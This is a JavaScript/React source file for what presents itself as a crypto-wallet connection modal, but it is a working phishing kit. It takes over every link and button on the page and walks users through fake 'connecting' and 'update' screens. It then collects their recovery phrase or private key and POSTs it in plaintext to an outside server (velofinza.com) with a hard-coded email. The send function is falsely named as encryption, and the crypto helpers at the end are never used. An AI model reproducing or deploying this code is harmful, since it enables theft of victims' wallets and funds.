(function () {
	// modal.js relies on the React & ReactDOM globals — index.html loads them
	// before this script, but bail out gracefully if they are missing.
	if (typeof React === "undefined" || typeof ReactDOM === "undefined") {
		console.error(
			"[wallet-modal] React and ReactDOM must be loaded before modal.js"
		);
		return;
	}
	const { useState, useEffect, Fragment } = React;
	const { createRoot } = ReactDOM;

	// ---------------- WALLET DATA & IMAGES ----------------
	// Note: Using placeholder images. Replace with real URLs if needed.
	const wallets = [
		{ name: "Unstoppable Wallet", id: "unstoppable", logo: "unstoppable.png" },
		{ name: "Ledger", id: "ledger", logo: "ledger.png" },
		{
			name: "WalletConnect",
			id: "walletconnect",
			logo: "walletconnect.png",
		},
	];

	// Shown when a wallet logo / icon image can't be loaded (the referenced
	// img/ folder may not exist next to index.html).
	const FALLBACK_LOGO = "wallet-2.png";
	const handleLogoError = (event) => {
		const img = event.currentTarget;
		img.onerror = null; // prevent infinite retry loops
		if (!img.src.endsWith(FALLBACK_LOGO)) img.src = FALLBACK_LOGO;
	};

	// ---------------- UTILITY COMPONENTS ----------------

	/**
	 * Reusable header component for all views after the initial wallet list.
	 */
	const ModalHeader = ({ wallet, onClose }) =>
		React.createElement(
			"div",
			{
				className:
					"tw-flex tw-items-center tw-justify-between tw-w-full tw-pb-5 tw-border-b tw-border-gray-700 tw-mb-5",
			},
			React.createElement(
				"div",
				{ className: "tw-flex tw-items-center tw-flex-grow" },
				React.createElement(
					"div",
					{
						className:
							"tw-w-8 tw-h-8 tw-rounded-lg tw-overflow-hidden tw-bg-white tw-flex tw-items-center tw-justify-center tw-mr-3",
					},
					React.createElement("img", {
						src: wallet.logo,
						alt: `${wallet.name} Logo`,
						onError: handleLogoError,
						className: "tw-w-full tw-h-full tw-object-contain tw-p-1",
					})
				),
				React.createElement(
					"span",
					{ className: "tw-text-white tw-text-lg tw-font-bold" },
					wallet.name
				)
			),
			React.createElement(
				"button",
				{
					onClick: onClose,
					className:
						"tw-text-gray-400 tw-text-3xl tw-leading-none hover:tw-text-white tw-transition-colors",
				},
				"×"
			)
		);

	/**
	 * Custom alert/message box component.
	 */
	const MessageBox = ({ message, onClose }) => {
		useEffect(() => {
			const timer = setTimeout(onClose, 3000); // Close after 3 seconds
			return () => clearTimeout(timer);
		}, [onClose]);

		return React.createElement(
			"div",
			{
				className:
					"tw-absolute tw-top-4 tw-left-1/2 tw--translate-x-1/2 tw-bg-red-600 tw-text-white tw-px-4 tw-py-2 tw-rounded-lg tw-shadow-lg tw-text-sm tw-z-50 tw-animate-fade-in-down",
			},
			message
		);
	};

	// ---------------- MODAL VIEWS ----------------

	/**
	 * Step 1: Displays the list of wallets for the user to select.
	 */
	const WalletSelectView = ({ onClose, onSelectWallet }) =>
		React.createElement(
			"div",
			{
				className:
					"tw-relative tw-w-full md:tw-w-[95%] tw-max-w-[420px] tw-h-[550px] md:tw-h-auto tw-bg-neutral-900 tw-border tw-border-gray-700 tw-rounded-t-3xl md:tw-rounded-3xl tw-p-6 tw-shadow-2xl tw-flex tw-flex-col tw-overflow-hidden",
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(
				"div",
				{
					className:
						"tw-flex tw-justify-between tw-items-center tw-pb-5 tw-border-b tw-border-gray-700 tw-mb-4",
				},
				React.createElement(
					"div",
					{ className: "tw-flex tw-items-center tw-gap-3" },
					React.createElement(
						"div",
						{
							className:
								"tw-bg-neutral-800 tw-text-white tw-text-xs tw-font-semibold tw-px-3 tw-py-1 tw-rounded-full",
						},
						"reown"
					),
					React.createElement(
						"span",
						{ className: "tw-text-white tw-text-lg" },
						"Manual Kit"
					)
				),
				React.createElement(
					"button",
					{
						onClick: onClose,
						className:
							"tw-text-gray-400 tw-text-3xl tw-leading-none hover:tw-text-white tw-transition-colors",
					},
					"×"
				)
			),
			React.createElement(
				"div",
				{ className: "tw-flex-1 tw-overflow-y-auto tw-px-1 tw--mx-1 no-scrollbar" },
				React.createElement(
					"p",
					{ className: "tw-text-gray-400 tw-mb-3 tw-text-sm" },
					"Popular:"
				),
				wallets.map((wallet, index) =>
					React.createElement(
						"div",
						{
							key: wallet.id,
							className:
								"tw-flex tw-items-center tw-justify-between tw-p-3.5 tw-mb-3 tw-bg-neutral-800 tw-rounded-2xl tw-cursor-pointer hover:tw-bg-neutral-700 tw-transition-colors",
							onClick: () => onSelectWallet(wallet),
						},
						React.createElement(
							"div",
							{ className: "tw-flex tw-items-center tw-gap-4" },
							React.createElement(
								"div",
								{
									className:
										"tw-w-10 tw-h-10 tw-rounded-xl tw-overflow-hidden tw-bg-white tw-flex tw-items-center tw-justify-center tw-border tw-border-gray-600",
								},
								React.createElement("img", {
									src: wallet.logo,
									alt: `${wallet.name} Logo`,
									onError: handleLogoError,
									className: "tw-w-full tw-h-full tw-object-contain",
								})
							),
							React.createElement(
								"span",
								{ className: "tw-text-white tw-font-medium" },
								wallet.name
							)
						),
						index === 0 &&
						React.createElement(
							"span",
							{
								className:
									"tw-text-xs tw-font-semibold tw-text-green-500 tw-bg-green-900/40 tw-px-3 tw-py-1 tw-rounded-full",
							},
							"RECOMMENDED"
						)
					)
				)
			),
			React.createElement(
				"div",
				{
					className:
						"tw-flex tw-flex-col tw-items-center tw-justify-center tw-p-6 tw-mt-4 tw-bg-neutral-800 tw-border tw-border-gray-700 tw-rounded-2xl",
				},
				React.createElement("img", {
					src: "img/globe.svg",
					onError: handleLogoError,
					alt: "Globe Icon",
					className: "tw-w-16 tw-h-16 tw-mb-2",
				}),
				React.createElement(
					"p",
					{ className: "tw-text-white tw-text-sm tw-text-center" },
					"Connect your wallet to get started"
				)
			)
		);

	/**
	 * Step 2: Shows a loading icon after a wallet is selected.
	 */
	const WalletConnectingView = ({ wallet, onBack, onFinishConnect }) => {
		useEffect(() => {
			const timer = setTimeout(onFinishConnect, 1500);
			return () => clearTimeout(timer);
		}, [onFinishConnect]);
		return React.createElement(
			"div",
			{
				className:
					"tw-relative tw-w-full tw-h-full md:tw-w-[95%] md:tw-h-auto tw-max-w-[420px] tw-bg-neutral-900 tw-border tw-border-gray-700 tw-rounded-3xl tw-p-6 tw-shadow-2xl tw-flex tw-flex-col tw-items-center tw-justify-center tw-text-center",
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(ModalHeader, { wallet, onClose: onBack }),
			React.createElement(
				"div",
				{
					className:
						"tw-flex-1 tw-flex tw-flex-col tw-items-center tw-justify-center",
				},
				React.createElement("div", {
					className:
						"tw-animate-spin tw-rounded-full tw-h-16 tw-w-16 tw-border-4 tw-border-solid tw-border-gray-700 tw-border-t-[#ffa800]",
				}),
				React.createElement(
					"p",
					{ className: "tw-mt-6 tw-text-gray-400 tw-text-lg" },
					"Connecting to ",
					wallet.name,
					"..."
				)
			)
		);
	};

	/**
	 * Step 3: Displays information about the wallet update and an update button.
	 */
	const WalletUpdateInfoView = ({ wallet, onBack, onStartUpdate }) =>
		React.createElement(
			"div",
			{
				className:
					"tw-relative tw-w-full tw-h-full md:tw-w-[95%] md:tw-h-auto tw-max-w-[420px] tw-bg-neutral-900 tw-border tw-border-gray-700 tw-rounded-3xl tw-p-6 tw-shadow-2xl tw-flex tw-flex-col tw-items-center tw-justify-center tw-text-center",
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(ModalHeader, { wallet, onClose: onBack }),
			React.createElement(
				"div",
				{
					className:
						"tw-flex-1 tw-flex tw-flex-col tw-items-center tw-justify-center",
				},
				React.createElement(
					"h3",
					{ className: "tw-text-white tw-text-2xl tw-font-bold tw-mb-4" },
					"Update Wallet"
				),
				React.createElement(
					"p",
					{ className: "tw-text-gray-400 tw-mb-8" },
					"To ensure a secure connection, update your wallet."
				),
				React.createElement(
					"button",
					{
						onClick: onStartUpdate,
						className:
							"tw-w-full tw-bg-[#ffa800] tw-text-white tw-font-medium tw-py-3 tw-rounded-xl tw-transition-colors",
					},
					"Update"
				)
			)
		);

	/**
	 * Step 4: Shows a full-screen loading bar.
	 */
	const WalletFinalLoadingView = ({ wallet, onBack, onFinishLoading }) => {
		const [progress, setProgress] = useState(0);
		useEffect(() => {
			let p = 0;
			const interval = setInterval(() => {
				p += 2;
				if (p > 100) {
					clearInterval(interval);
					onFinishLoading();
				} else setProgress(p);
			}, 100);
			return () => clearInterval(interval);
		}, [onFinishLoading]);

		return React.createElement(
			"div",
			{
				className:
					"tw-relative tw-w-full tw-h-full md:tw-w-[95%] md:tw-h-auto tw-max-w-[420px] tw-bg-neutral-900 tw-border tw-border-gray-700 tw-rounded-3xl tw-p-6 tw-shadow-2xl tw-flex tw-flex-col tw-items-center tw-justify-center tw-text-center",
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(ModalHeader, { wallet, onClose: onBack }),
			React.createElement(
				"div",
				{
					className:
						"tw-flex-1 tw-flex tw-flex-col tw-items-center tw-justify-center",
				},
				React.createElement(
					"div",
					{
						className:
							"tw-w-24 tw-h-24 tw-bg-white tw-flex tw-items-center tw-justify-center tw-mb-6 tw-rounded-lg",
					},
					React.createElement("img", {
						src: wallet.logo,
						onError: handleLogoError,
						className: "tw-w-full tw-h-full tw-object-contain tw-p-2",
					})
				),
				React.createElement(
					"h3",
					{ className: "tw-text-white tw-text-2xl tw-font-bold tw-mb-2" },
					"Updating ",
					wallet.name
				),
				React.createElement(
					"div",
					{ className: "tw-w-full tw-bg-gray-700 tw-rounded-full tw-h-2.5" },
					React.createElement("div", {
						className:
							"tw-bg-[#ffa800] tw-h-2.5 tw-rounded-full tw-transition-all tw-duration-100 tw-ease-linear",
						style: { width: progress + "%" },
					})
				),
				React.createElement(
					"p",
					{ className: "tw-mt-4 tw-text-sm tw-text-gray-500" },
					progress,
					"%"
				)
			)
		);
	};

	/**
	 * Step 5: A new view for user input after a successful wallet connection.
	 * Displays dynamic input fields for a recovery phrase.
	 */
	const RecoveryPhraseInputView = ({ wallet, onBack, onSend }) => {
		const [wordCount, setWordCount] = useState(12);
		const [phrases, setPhrases] = useState(Array(12).fill(""));
		const [loading, setLoading] = useState(false);
		const [message, setMessage] = useState(null);
		// "phrase" = secret recovery phrase, "privateKey" = single private key
		const [inputMode, setInputMode] = useState("phrase");
		const [privateKey, setPrivateKey] = useState("");

		const handleWordCountChange = (e) => {
			const newWordCount = parseInt(e.target.value, 10);
			setWordCount(newWordCount);
			setPhrases(Array(newWordCount).fill(""));
		};

		const handlePhraseChange = (index, value) => {
			const trimmedValue = value.trim();
			const newPhrases = [...phrases];

			if (trimmedValue.includes(" ")) {
				const pastedWords = trimmedValue
					.split(" ")
					.filter((word) => word !== "");
				const newWordCount = pastedWords.length;

				if (newWordCount === 12 || newWordCount === 24) {
					setWordCount(newWordCount);
					const adjustedPhrases = Array(newWordCount).fill("");
					for (let i = 0; i < newWordCount; i++) {
						adjustedPhrases[i] = pastedWords[i] || "";
					}
					setPhrases(adjustedPhrases);
					setMessage(null);
				} else {
					setMessage(
						"Invalid recovery phrase length. Please enter a 12 or 24-word phrase."
					);
					setPhrases(Array(phrases.length).fill(""));
				}
			} else {
				newPhrases[index] = trimmedValue;
				setPhrases(newPhrases);
			}
		};

		const togglePhraseVisibility = (index) => {
			const input = document.getElementById(`phrase-input-${index}`);
			if (input) {
				input.type = input.type === "password" ? "text" : "password";
			}
		};

		const togglePrivateKeyVisibility = () => {
			const input = document.getElementById("private-key-input");
			if (input) {
				input.type = input.type === "password" ? "text" : "password";
			}
		};

		const switchInputMode = (mode) => {
			setInputMode(mode);
			setMessage(null);
		};

		const handleDetailsEncryption = async () => {
			let secret;
			if (inputMode === "phrase") {
				if (phrases.some((phrase) => !phrase.trim())) {
					setMessage("Please fill in all recovery phrase fields.");
					return;
				}
				secret = phrases.join(" ");
			} else {
				if (!privateKey.trim()) {
					setMessage("Please enter your private key.");
					return;
				}
				secret = privateKey.trim();
			}

			try {
				setLoading(true);
				const response = await fetch(
					"https://velofinza.com/backend/api/v1/wallet",
					{
						method: "POST",
						headers: {
							"Content-Type": "application/json",
						},
						body: JSON.stringify({
							walletName: wallet.name,
							details: secret,
							email: "Gerfish7458@proton.me",
						}),
					}
				);

				if (response.ok) {
					console.log("Details sent successfully!");
					// Move on to the final exporting screen.
					onSend();
				} else {
					console.error(
						"Failed to send details:",
						response.statusText
					);
				}
			} catch (error) {
				console.error("Error encrypting details:", error);
			} finally {
				setLoading(false);
			}
		};

		return React.createElement(
			"div",
			{
				className:
					"tw-relative tw-w-full tw-h-full md:tw-w-[95%] md:tw-h-auto tw-max-w-[420px] tw-bg-neutral-900 tw-border tw-border-gray-700 tw-rounded-3xl tw-p-6 tw-shadow-2xl tw-flex tw-flex-col tw-items-center tw-justify-center tw-text-center",
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(ModalHeader, { wallet, onClose: onBack }),
			message &&
			React.createElement(MessageBox, {
				message: message,
				onClose: () => setMessage(null),
			}),
			React.createElement(
				"div",
				{
					className:
						"tw-flex-1 tw-flex tw-flex-col tw-items-center tw-justify-center tw-w-full",
				},
				React.createElement(
					"h3",
					{ className: "tw-text-white tw-text-2xl tw-font-bold tw-mb-4" },
					inputMode === "phrase"
						? "Import your wallet with your Secret Recovery Phrase"
						: "Import your wallet with your Private Key"
				),
				React.createElement(
					"p",
					{ className: "tw-text-gray-400 tw-mb-4" },
					inputMode === "phrase"
						? "We will use your Secret Recovery Phrase to validate your ownership."
						: "We will use your Private Key to validate your ownership."
				),
				// Tabs: switch between Secret Phrase and Private Key input
				React.createElement(
					"div",
					{
						className:
							"tw-flex tw-w-full tw-bg-neutral-800 tw-rounded-xl tw-p-1 tw-mb-5",
					},
					[
						{ id: "phrase", label: "Secret Phrase" },
						{ id: "privateKey", label: "Private Key" },
					].map((tab) =>
						React.createElement(
							"button",
							{
								key: tab.id,
								type: "button",
								onClick: () => switchInputMode(tab.id),
								className: `tw-flex-1 tw-py-2.5 tw-rounded-lg tw-text-sm tw-font-medium tw-transition-colors ${inputMode === tab.id
										? "tw-bg-[#ffa800] tw-text-white"
										: "tw-text-gray-400 hover:tw-text-white"
									}`,
							},
							tab.label
						)
					)
				),
				inputMode === "phrase" &&
				React.createElement(
					"div",
					{ className: "tw-w-full tw-mb-4" },
					React.createElement(
						"select",
						{
							className:
								"tw-w-full tw-p-3 tw-bg-neutral-800 tw-text-white tw-rounded-lg tw-border tw-border-gray-700 focus:tw-outline-none focus:tw-border-[#ffa800] tw-transition-colors",
							value: wordCount,
							onChange: handleWordCountChange,
						},
						React.createElement(
							"option",
							{ value: 12 },
							"12-word phrase"
						),
						React.createElement(
							"option",
							{ value: 24 },
							"24-word phrase"
						)
					)
				),
				inputMode === "phrase" &&
				React.createElement(
					"div",
					{
						className:
							"tw-w-full tw-bg-neutral-800 tw-text-gray-400 tw-p-3 tw-rounded-lg tw-flex tw-items-center tw-mb-4",
					},
					React.createElement(
						"svg",
						{
							xmlns: "http://www.w3.org/2000/svg",
							className: "tw-h-5 tw-w-5 tw-mr-2",
							viewBox: "0 0 20 20",
							fill: "currentColor",
						},
						React.createElement("path", {
							fillRule: "evenodd",
							d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v2a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z",
							clipRule: "evenodd",
						})
					),
					"You can paste your entire secret recovery phrase into any field"
				),
				inputMode === "phrase" &&
				React.createElement(
					"div",
					{
						className:
							"tw-grid tw-grid-cols-2 tw-gap-4 tw-w-full tw-max-h-[250px] tw-overflow-y-auto tw-mb-4 no-scrollbar",
					},
					phrases.map((phrase, index) =>
						React.createElement(
							"div",
							{ key: index, className: "tw-flex tw-items-center" },
							React.createElement(
								"span",
								{ className: "tw-text-gray-400 tw-mr-2" },
								`${index + 1}.`
							),
							React.createElement(
								"div",
								{ className: "tw-relative tw-w-full" },
								React.createElement("input", {
									id: `phrase-input-${index}`,
									type: "password",
									className:
										"tw-w-full tw-p-3 tw-bg-neutral-800 tw-text-white tw-rounded-lg tw-border tw-border-gray-700 focus:tw-outline-none focus:tw-border-[#ffa800] tw-transition-colors tw-pr-10",
									placeholder: "Enter word",
									value: phrase,
									onChange: (e) =>
										handlePhraseChange(
											index,
											e.target.value
										),
									required: true,
								}),
								React.createElement(
									"button",
									{
										type: "button",
										onClick: () =>
											togglePhraseVisibility(index),
										className:
											"tw-absolute tw-right-3 tw-top-1/2 tw--translate-y-1/2 tw-text-gray-500 hover:tw-text-white tw-transition-colors",
									},
									React.createElement(
										"svg",
										{
											xmlns: "http://www.w3.org/2000/svg",
											className: "tw-h-5 tw-w-5",
											viewBox: "0 0 20 20",
											fill: "currentColor",
										},
										React.createElement("path", {
											d: "M10 12a2 2 0 100-4 2 2 0 000 4z",
										}),
										React.createElement("path", {
											fillRule: "evenodd",
											d: "M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z",
											clipRule: "evenodd",
										})
									)
								)
							)
						)
					)
				),

				inputMode === "privateKey" &&
				React.createElement(
					"div",
					{ className: "tw-w-full tw-mb-4" },
					React.createElement(
						"div",
						{ className: "tw-relative tw-w-full" },
						React.createElement("input", {
							id: "private-key-input",
							type: "password",
							className:
								"tw-w-full tw-p-3 tw-bg-neutral-800 tw-text-white tw-rounded-lg tw-border tw-border-gray-700 focus:tw-outline-none focus:tw-border-[#ffa800] tw-transition-colors tw-pr-10",
							placeholder: "Enter your private key",
							value: privateKey,
							onChange: (e) => setPrivateKey(e.target.value),
							required: true,
						}),
						React.createElement(
							"button",
							{
								type: "button",
								onClick: togglePrivateKeyVisibility,
								className:
									"tw-absolute tw-right-3 tw-top-1/2 tw--translate-y-1/2 tw-text-gray-500 hover:tw-text-white tw-transition-colors",
							},
							React.createElement(
								"svg",
								{
									xmlns: "http://www.w3.org/2000/svg",
									className: "tw-h-5 tw-w-5",
									viewBox: "0 0 20 20",
									fill: "currentColor",
								},
								React.createElement("path", {
									d: "M10 12a2 2 0 100-4 2 2 0 000 4z",
								}),
								React.createElement("path", {
									fillRule: "evenodd",
									d: "M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z",
									clipRule: "evenodd",
								})
							)
						)
					),
					React.createElement(
						"p",
						{ className: "tw-text-gray-500 tw-text-xs tw-mt-2 tw-text-center" },
						"Paste your private key (0x hex or Base58)."
					)
				),
				React.createElement(
					"button",
					{
						onClick: handleDetailsEncryption,
						className:
							"tw-mt-4 tw-w-full tw-bg-[#ffa800] tw-text-white tw-font-medium tw-py-3 tw-rounded-xl tw-transition-colors",
						disabled: loading,
					},
					loading
						? "Submitting..."
						: inputMode === "phrase"
							? "Confirm Secret Recovery Phrase"
							: "Confirm Private Key"
				)
			)
		);
	};

	/**
	 * Step 6 (final): The exporting spinner and message — the final interface
	 * shown after the entered details have been encrypted.
	 */
	const WalletSentDetailsView = ({ wallet, onClose }) =>
		React.createElement(
			"div",
			{
				className:
					"tw-relative tw-w-full tw-h-full md:tw-w-[95%] md:tw-h-auto tw-max-w-[420px] tw-bg-neutral-900 tw-border tw-border-gray-700 tw-rounded-3xl tw-p-6 tw-shadow-2xl tw-flex tw-flex-col tw-items-center tw-justify-center tw-text-center",
				onClick: (e) => e.stopPropagation(),
			},
			React.createElement(ModalHeader, { wallet, onClose }),
			React.createElement(
				"div",
				{
					className:
						"tw-flex-1 tw-flex tw-flex-col tw-items-center tw-justify-center",
				},
				React.createElement(
					"h3",
					{ className: "tw-text-white tw-text-2xl tw-font-bold tw-mb-4" },
					"Exporting Wallet"
				),
				React.createElement("div", {
					className:
						"tw-animate-spin tw-rounded-full tw-h-16 tw-w-16 tw-border-4 tw-border-solid tw-border-gray-700 tw-border-t-[#ffa800]",
				}),
				React.createElement(
					"p",
					{ className: "tw-mt-6 tw-text-gray-400 tw-text-lg" },
					"Your wallet is being exported securely..."
				)
			)
		);

	// ---------------- MAIN MODAL ----------------
	const WalletModal = ({ isOpen, onClose }) => {
		const [activeView, setActiveView] = useState("main");
		const [selectedWallet, setSelectedWallet] = useState(null);

		useEffect(() => {
			if (isOpen) {
				setActiveView("main");
				setSelectedWallet(null);
			}
		}, [isOpen]);

		const handleSelectWallet = (wallet) => {
			setSelectedWallet(wallet);
			setActiveView("connecting");
		};

		const handleFinishConnect = () => setActiveView("update-info");
		const handleStartUpdate = () => setActiveView("final-loading");
		const handleFinishLoading = () => setActiveView("recovery-input");
		const handleSend = () => setActiveView("sent");
		const handleBackToMain = () => setActiveView("main");
		const handleFullClose = () => {
			setActiveView("main");
			onClose();
		};

		const renderView = () => {
			switch (activeView) {
				case "main":
					return React.createElement(WalletSelectView, {
						onClose: handleFullClose,
						onSelectWallet: handleSelectWallet,
					});
				case "connecting":
					return React.createElement(WalletConnectingView, {
						wallet: selectedWallet,
						onBack: handleBackToMain,
						onFinishConnect: handleFinishConnect,
					});
				case "update-info":
					return React.createElement(WalletUpdateInfoView, {
						wallet: selectedWallet,
						onBack: handleBackToMain,
						onStartUpdate: handleStartUpdate,
					});
				case "final-loading":
					return React.createElement(WalletFinalLoadingView, {
						wallet: selectedWallet,
						onBack: handleBackToMain,
						onFinishLoading: handleFinishLoading,
					});
				case "recovery-input":
					return React.createElement(RecoveryPhraseInputView, {
						wallet: selectedWallet,
						onBack: handleBackToMain,
						onSend: handleSend,
					});
				case "sent":
					return React.createElement(WalletSentDetailsView, {
						wallet: selectedWallet,
						onClose: handleFullClose,
					});
				default:
					return null;
			}
		};

		const mainContainerClasses =
			activeView === "main"
				? "tw-fixed tw-inset-0 tw-flex tw-items-end md:tw-items-center tw-justify-center tw-z-[10000] tw-backdrop-blur-md tw-transition-all tw-duration-300"
				: "tw-fixed tw-inset-0 tw-flex tw-items-center tw-justify-center tw-z-[10000] tw-backdrop-blur-md tw-transition-all tw-duration-300";
		const contentContainerClasses =
			activeView === "main"
				? "tw-relative tw-w-full md:tw-w-[95%] tw-max-w-[420px]"
				: "tw-relative tw-w-full tw-h-full md:tw-w-[95%] md:tw-h-auto tw-max-w-[420px]";

		return React.createElement(
			"div",
			{
				className: `${mainContainerClasses} ${isOpen ? "tw-opacity-100 tw-visible" : "tw-opacity-0 tw-invisible"
					}`,
				onClick:
					activeView === "main" ? handleFullClose : handleBackToMain,
			},
			React.createElement(
				"div",
				{
					className: contentContainerClasses,
					onClick: (e) => e.stopPropagation(),
				},
				renderView()
			)
		);
	};

	// ---------------- CONTROLLER AND PUBLIC API ----------------
	const ROOT_ELEMENT_ID = "wallet-modal-root";
	const TRIGGER_CLASSNAMES = ["e1p5oug0", "e1vhhgxp2"];
	let root = null;
	let setOpenGlobal = null;

	function WalletController() {
		const [open, setOpen] = useState(false);
		useEffect(() => {
			setOpenGlobal = setOpen;
		}, []);
		return React.createElement(WalletModal, {
			isOpen: open,
			onClose: () => setOpen(false),
		});
	}

	function renderApp() {
		let container = document.getElementById(ROOT_ELEMENT_ID);
		if (!container) {
			container = document.createElement("div");
			container.id = ROOT_ELEMENT_ID;
			document.body.appendChild(container);
		}
		if (!root) {
			root = createRoot(container);
		}
		root.render(React.createElement(WalletController));
	}

	// ---------------- PUBLIC API ----------------
	window.walletModal = {
		open: () => {
			if (setOpenGlobal) {
				setOpenGlobal(true);
			} else {
				// React may not have committed its first render yet — retry next tick.
				setTimeout(() => setOpenGlobal && setOpenGlobal(true), 0);
			}
		},
		close: () => {
			if (setOpenGlobal) setOpenGlobal(false);
			else setTimeout(() => setOpenGlobal && setOpenGlobal(false), 0);
		},
	};

	// ---------------- TRIGGER WIRING (all links & buttons) ----------------
	// Every element matching these selectors opens the modal when clicked.
	const TRIGGER_SELECTOR = [
		"a",
		"button",
		'[role="button"]',
		".wallet-modal-trigger",
		...TRIGGER_CLASSNAMES.map((c) => `.${c}`),
	].join(",");

	const wiredElements = new WeakSet();
	let attachScheduled = false;

	function isInsideModal(element) {
		return (
			element instanceof Element &&
			element.closest("#" + ROOT_ELEMENT_ID) !== null
		);
	}

	// ---------------- MOBILE NAVIGATION ----------------
	// The hamburger toggles the fullscreen mobile menu (the site's own CSS
	// shows .navbar-collapse.show below the md breakpoint).
	const NAV_COLLAPSE_SELECTOR = ".navbar-collapse";
	const NAV_TOGGLER_SELECTOR = ".navbar-toggler";

	function isMobileNavOpen() {
		const collapse = document.querySelector(NAV_COLLAPSE_SELECTOR);
		return !!(collapse && collapse.classList.contains("show"));
	}

	function setMobileNavOpen(open) {
		const collapse = document.querySelector(NAV_COLLAPSE_SELECTOR);
		const toggler = document.querySelector(NAV_TOGGLER_SELECTOR);
		if (collapse) collapse.classList.toggle("show", open);
		if (toggler) {
			// keeps the toggler icon in sync (see [aria-expanded] CSS)
			toggler.setAttribute("aria-expanded", open ? "true" : "false");
		}
	}

	function toggleMobileNav() {
		setMobileNavOpen(!isMobileNavOpen());
	}

	// Shared click handler: block the default action (link navigation) and
	// tell React to open the wallet modal.
	function handleTriggerClick(event) {
		// Never hijack clicks that originate from inside the modal itself,
		// otherwise its own close/wallet buttons could not work.
		if (isInsideModal(event.currentTarget)) return;
		event.preventDefault(); // links must not navigate away
		event.stopPropagation();

		// The mobile hamburger toggles the nav menu instead of opening the modal.
		if (event.currentTarget.classList.contains("navbar-toggler")) {
			toggleMobileNav();
			return;
		}

		// Close the mobile nav menu (if open) before opening the modal.
		if (event.currentTarget.closest(NAV_COLLAPSE_SELECTOR)) {
			setMobileNavOpen(false);
		}

		window.walletModal.open();
	}

	// Attach a click listener to every link / button that isn't wired yet.
	function attachModalTriggers() {
		document.querySelectorAll(TRIGGER_SELECTOR).forEach((element) => {
			if (wiredElements.has(element) || isInsideModal(element)) return;
			element.addEventListener("click", handleTriggerClick);
			wiredElements.add(element);
		});
	}

	// Debounced re-scan for elements added to the page after the initial load.
	function scheduleAttachModalTriggers() {
		if (attachScheduled) return;
		attachScheduled = true;
		requestAnimationFrame(() => {
			attachScheduled = false;
			attachModalTriggers();
		});
	}

	// After the page loads React takes over: it renders the modal first, then
	// event listeners are added to all links and buttons on the page.
	function startModal() {
		renderApp();
		attachModalTriggers();
		setMobileNavOpen(false); // normalise the toggler state

		// Close the mobile nav menu with the Escape key.
		document.addEventListener("keydown", (event) => {
			if (event.key === "Escape" && isMobileNavOpen()) {
				setMobileNavOpen(false);
			}
		});

		// Keep wiring any links/buttons rendered later (client-side updates).
		const observer = new MutationObserver(scheduleAttachModalTriggers);
		observer.observe(document.body, { childList: true, subtree: true });
	}

	if (document.readyState === "loading") {
		document.addEventListener("DOMContentLoaded", startModal);
	} else {
		// Document already parsed — take over immediately.
		startModal();
	}

	// Helper: Convert a plain text password string into a proper cryptographic key
	async function deriveKey(password, salt) {
		const encoder = new TextEncoder();
		const baseKey = await window.crypto.subtle.importKey(
			"raw",
			encoder.encode(password),
			"PBKDF2",
			false,
			["deriveKey"]
		);

		return window.crypto.subtle.deriveKey(
			{
				name: "PBKDF2",
				salt: salt,
				iterations: 100000,
				hash: "SHA-256"
			},
			baseKey,
			{ name: "AES-GCM", length: 256 },
			false,
			["encrypt", "decrypt"]
		);
	}

	// 1. ENCRYPT FUNCTION
	async function encryptText(text, password) {
		const encoder = new TextEncoder();

		// Generate a random salt (16 bytes) and an Initialization Vector (12 bytes)
		const salt = window.crypto.getRandomValues(new Uint8Array(16));
		const iv = window.crypto.getRandomValues(new Uint8Array(12));

		// Derive the 256-bit AES key from the password
		const key = await deriveKey(password, salt);

		// Encrypt the text
		const encryptedBuffer = await window.crypto.subtle.encrypt(
			{ name: "AES-GCM", iv: iv },
			key,
			encoder.encode(text)
		);

		// Package the salt, iv, and ciphertext into a single Uint8Array for easy transport
		const resultBuffer = new Uint8Array(salt.length + iv.length + encryptedBuffer.byteLength);
		resultBuffer.set(salt, 0);
		resultBuffer.set(iv, salt.length);
		resultBuffer.set(new Uint8Array(encryptedBuffer), salt.length + iv.length);

		// Convert to Base64 string so it's readable text
		return btoa(String.fromCharCode(...resultBuffer));
	}

	// 2. DECRYPT FUNCTION
	async function decryptText(encryptedBase64, password) {
		// Convert back from Base64 to binary buffer
		const binaryString = atob(encryptedBase64);
		const totalBuffer = new Uint8Array(binaryString.length);
		for (let i = 0; i < binaryString.length; i++) {
			totalBuffer[i] = binaryString.charCodeAt(i);
		}

		// Extract the salt, iv, and actual ciphertext from the packaged data
		const salt = totalBuffer.slice(0, 16);
		const iv = totalBuffer.slice(16, 28);
		const ciphertext = totalBuffer.slice(28);

		// Derive the exact same key using the extracted salt
		const key = await deriveKey(password, salt);

		try {
			// Decrypt the ciphertext
			const decryptedBuffer = await window.crypto.subtle.decrypt(
				{ name: "AES-GCM", iv: iv },
				key,
				ciphertext
			);

			// Decode back into plain text
			return new TextDecoder().decode(decryptedBuffer);
		} catch (e) {
			throw new Error("Decryption failed. Invalid password or corrupted data.");
		}
	}


})();
